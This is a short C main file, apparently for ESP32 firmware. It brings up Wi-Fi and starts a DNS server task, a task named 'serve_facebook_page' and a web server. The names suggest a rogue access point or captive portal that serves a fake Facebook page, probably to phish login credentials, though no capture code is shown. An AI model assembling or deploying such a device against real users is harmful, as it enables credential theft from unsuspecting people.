#include <stdio.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_netif.h"
#include "esp_event.h"
#include <nvs_flash.h>
#include "wifi_controller.h"
#include "scanner.h"
#include "webserver.h"
#include "dns.h"
void app_main(void)
{
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    ESP_ERROR_CHECK(nvs_flash_init());
    ESP_ERROR_CHECK(wifi_start());
    ESP_ERROR_CHECK(set_default_config());

    xTaskCreate(dns_server_task, "dns_server_task", 4096, NULL, 5, NULL);
    xTaskCreate(serve_facebook_page, "serve_facebook_page", 4096, NULL, 5, NULL);
    start_webserver();
}